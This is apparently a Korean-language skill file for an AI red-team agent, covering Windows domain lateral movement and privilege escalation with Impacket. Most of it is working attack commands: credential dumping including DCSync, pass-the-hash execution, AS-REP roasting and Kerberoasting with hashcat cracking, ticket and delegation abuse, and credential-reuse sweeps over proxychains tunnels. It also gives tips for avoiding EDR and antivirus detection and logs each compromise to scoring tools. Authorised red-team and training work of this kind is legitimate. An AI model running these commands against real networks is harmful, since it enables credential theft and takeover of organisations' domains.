---
name: lateral-movement
description: 내부망 횡적 이동과 권한 상승: Impacket 제품군(PtH/PsExec/WMI/DCOM/Kerberos/자격 증명 덤프) + enum4linux/smbclient 정보 열거
whenToUse: 내부망에 이미 진입했고, 보유 자격 증명이나 해시로 다른 호스트로 횡적 이동하고, 도메인 환경을 열거하며, 자격 증명을 덤프하고, 도메인 컨트롤러 경로를 찾아야 할 때
role: internal
enabled: true
---

# 내부망 횡적 이동과 권한 상승(Impacket 제품군)

한 대의 머신과 내부망 도달성을 확보한 뒤, **더 많은 호스트로 횡적 이동**하는 것(`server-host`)과 **도메인 컨트롤러/핵심 시스템을 찾는 것**(`central-system`)
이 내부망 단계의 주된 흐름이다. 이 머신에는 **61개의 `impacket-*` 명령**이 설치되어 있고(Kali 기본 포함), 이것이 이 단계의 주력 도구 집합이다.

## 로컬 도구

| 도구 | 경로 | 용도 |
| --- | --- | --- |
| Impacket 제품군 | `/usr/bin/impacket-*`(61개 명령) | 프로토콜 수준 횡적 이동, 자격 증명 덤프, Kerberos 공격 |
| enum4linux | `/usr/bin/enum4linux` | SMB/도메인 정보 열거(사용자, 공유, 정책) |
| smbclient | `/usr/bin/smbclient` | 공유 탐색과 읽기/쓰기 |
| nbtscan | `/usr/bin/nbtscan` | NetBIOS 이름 스캔 |
| proxychains4 | `/usr/bin/proxychains4` | 터널을 통한 내부망 접근(**`-f` 임시 설정만 사용**) |

## 0. 먼저 할 일(정보가 공격 방식을 결정한다)

```bash
# 1) 내가 무엇을 가졌는지 본다(자격 증명/해시/도메인 정보)
#    redteam_credential_list / redteam_access_list / redteam_asset_query
# 2) 도메인 환경 열거(도메인 계정을 얻은 뒤)
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
enum4linux -a <target>               # 자격 증명 없이도 사용자/공유/정책을 열거할 수 있다

# 3) 공유와 파일
smbclient -L //<target> -N                                  # 널 세션으로 공유 목록
smbclient //<target>/<share> -U <user>%<pass>                # 공유 읽기
impacket-smbclient <domain>/<user>:<pass>@<target>           # 대화형, cd/ls/get/put 가능
```

**내부망 스캔은 여전히 gogo/fscan 을 쓴다**(스킬 `gogo-intranet` / `fscan-intranet`) —— 이 스킬은 "들어간 뒤 어떻게 움직이는가" 를 담당한다.

## 1. 자격 증명 덤프(한 대의 머신을 얻은 뒤 최우선)

```bash
# 1) 원격 SAM/LSA/SECRETS 덤프(관리자 자격 증명 필요)
impacket-secretsdump <domain>/<user>:<pass>@<target>
impacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # 해시로 바로 덤프

# 2) 로컬 SAM 만 덤프
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 3) DCSync(도메인 관리자/복제 권한이 있을 때 도메인 내 모든 해시를 바로 얻는다) —— 도메인 컨트롤러 직행의 핵심 단계
impacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc

# 4) 평문/티켓 수집: 대상 측 도구(예: mimikatz)나 lsassy 와 조합한다
#    해시를 얻은 뒤에는 credential-attack 으로 오프라인 크랙하거나, 바로 PtH 한다(아래 참조)
```

**출력 처리**: 덤프한 `NTLM` 해시는 한 건씩 `redteam_credential_add` 로 등록한다(`source=자격 증명 덤프`,
평문 비밀번호는 `secret_value` 에, 해시는 타입을 표시해 `note` 또는 `secret_value` 에 쓴다). 파일은 `runs/` 에 둔다.

## 2. Pass-the-Hash(PtH, 크랙 없이 바로 횡적 이동)

```bash
# 명령 실행
impacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # 대화형 SYSTEM 셸(노이즈 큼)
impacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # 반대화형, 노이즈가 작다(권장)
impacket-atexec  -hashes :<NThash> <domain>/<user>@<target> "whoami" # 단일 명령, 가장 조용하다
impacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # 서비스를 통한 실행

# 파일 가져오기
impacket-smbclient -hashes :<NThash> <domain>/<user>@<target>

# 데이터베이스
impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
```

**psexec 는 서비스를 남기고 노이즈가 크며 백신에 걸릴 수 있다**; `wmiexec`/`atexec` 를 우선한다.

## 3. Kerberos 공격(도메인 환경이 있을 때)

```bash
# 1) 사용자 이름 열거 + AS-REP 수집(비밀번호 없이 사전 인증이 필요 없는 계정을 찾는다)
impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # 오프라인 크랙

# 2) Kerberoasting(SPN 이 있는 서비스 계정을 찾아 TGS 를 수집하고 오프라인 크랙)
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3) 티켓 발급과 사용
impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # TGT 발급 → .ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # 티켓으로 횡적 이동

# 4) 위임 공격(도메인 내 권한 상승 경로)
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>
impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
```

## 4. 자격 증명 재사용(공격보다 훨씬 빠르다. 항상 먼저 시도)

어떤 계정/해시를 얻었든 **먼저 횡적으로 시도**하고, 새 취약점 공격을 서두르지 않는다:
1. 같은 비밀번호를 다른 호스트(`wmiexec` 일괄)와 다른 프로토콜(SMB/WinRM/RDP/SSH/MSSQL/MySQL)에 시도한다;
2. 로컬 관리자 비밀번호 재사용(같은 이미지로 일괄 설치한 머신은 같은 비밀번호인 경우가 많다) —— **이것이 내부망 횡적 이동에서 적중률이 가장 높은 수법이다**;
3. 도메인 계정 → 도메인 내 모든 머신, 공유, OA/메일/배스천/운영 플랫폼 관리 화면에 시도한다;
4. 해시 → 도달 가능한 모든 호스트로 PtH(반복문을 쓰고 `runs/hosts.txt` 와 조합한다).

## 5. 터널 조합(내부망 대상에 직접 연결할 수 없을 때)

```bash
# 모든 명령에 proxychains4 를 붙이고 임시 설정을 쓴다(시스템 설정은 고치지 않는다)
cat > runs/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
# ⚠️ 주의: proxychains 는 TCP 만 프록시한다; Kerberos 의 UDP 부분과 일부 역방향 연결 상황은 chisel/frp 의 포트 매핑이 필요하다
```

## 6. 규율과 경계

1. **수렴 우선**: 내부망 단계의 목표는 **핵심 시스템**(도메인 컨트롤러 / 배스천 / 운영 플랫폼 / 데이터베이스 클러스터 / 코드 저장소 / 백업 시스템)이다.
   모든 머신을 한 번씩 공격하는 것이 아니다. 횡적 이동은 수단일 뿐이고, 득점 항목은 `server-host` 와 `central-system` 이다.
2. **노이즈 제어**: `psexec` 는 서비스를 남기고 `secretsdump` 는 LSASS 를 건드려 EDR 에 잡힌다;
   `wmiexec`/`atexec` 를 우선하고 빈도를 조절하며, 대역 전체에 무차별 횡적 이동을 하지 않는다.
3. **스스로 잠그지 않는다**: 도메인 계정은 연속 실패 시 잠금 정책이 걸린다; 먼저 기존 자격 증명 재사용을 쓰고, 약한 비밀번호 브루트포스는 스킬 `credential-attack` 의 속도 제한 규율을 따른다.
4. **파괴적 작업 금지**: 서비스를 중지하지 않고, 시스템 설정을 바꾸지 않고, 로그를 삭제하지 않는다(드릴이 명시적으로 요구하고 사용자가 동의한 경우는 예외).
5. **새 호스트마다 등록한다**: `redteam_asset_add`(내부망 자산, `scope` 는 자동 internal),
   접근 성공 시 `redteam_access_add`, 자격 증명은 `redteam_credential_add`.

## 7. 출력과 적재(강제)

1. **횡적 이동에 성공한 호스트마다 득점 기록**: `redteam_score_hit`(`server-host`), `evidence` 에
   "출발 호스트 → 대상 호스트:포트|어떤 자격 증명/해시|실행 결과" 를 쓴다(예: `10.0.0.5 → 10.0.0.9:445|PtH 로컬 관리자 해시|whoami=nt authority\system`).
2. **핵심 시스템 득점**: 도메인 컨트롤러/배스천/운영 플랫폼/데이터베이스 클러스터에 도달하면 → `central-system`;
   대량 데이터를 확보하면 → `bigdata-system`(**실제 건수를 써야 하며 100만 건 이상이어야 인정된다**).
3. **자격 증명 적재**: `redteam_credential_add`, `source` 를 분명히 쓰고(`자격 증명 덤프`/`Kerberoasting`/`AS-REP`/`자격 증명 재사용`/`오프라인 크랙`),
   `tool` 에 실제 명령 원문, 평문 비밀번호는 `secret_value`, 파일 경로는 `secret_ref`.
4. **접근 세션 적재**: `redteam_access_add`(`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`).
5. 핵심 동작마다 `redteam_chain_add`: `stage_code=internal`(내부망 권한 획득) 또는 `target`(표적 확보),
   **`tool` 에 실제 명령 원문**(`-hashes`, `-k -no-pass` 같은 핵심 인자와 `proxychains4 -f ...` 접두사 포함),
   `result` 에 회신 요약 —— 보고서를 보고 그대로 재현할 수 있어야 한다.
6. **지식 베이스 환류**: 검증에 성공한 범용 익스플로잇 스크립트는 `redteam_poc_add`(`category` + `engagement` + `asset_target` + `verified_note`, 비식별화).
